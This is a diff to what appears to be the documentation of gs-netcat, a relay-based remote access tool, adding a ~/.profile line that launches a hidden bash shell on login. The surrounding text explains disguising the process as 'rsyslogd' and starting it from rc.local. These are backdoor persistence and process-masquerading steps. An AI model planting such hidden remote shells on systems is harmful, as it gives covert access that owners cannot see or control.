@@ -198,6 +198,11 @@ exit 0
 ```
 The '(...)' brackets start a sub-shell which is then replaced (by *exec*) with gs-netcat. The gs-netcat process is hidden (as *rsyslogd*) from the process list. Set SHELL=/bin/bash to use bash instead of */bin/sh*. Read [how to enable rc.local](https://linuxmedium.com/how-to-enable-etc-rc-local-with-systemd-on-ubuntu-20-04/) if */etc/rc.local* does not exist.
 
+Starting when the user logs in (and only once) can be done by adding this line to the user's *~/.profile* file:
+```
+killall -0 gs-netcat 2>/dev/null || (GSOCKET_ARGS="-s MySecret -liqD" SHELL=/bin/bash exec -a -bash /usr/local/bin/gs-netcat)
+```
+
 ---
 **Crypto / Security Mumble Jumble**
 1. The security is end-2-end. This means from User-2-User (and not just to the Relay Network). The Relay Network relays only (encrypted) data to and from the Users. 
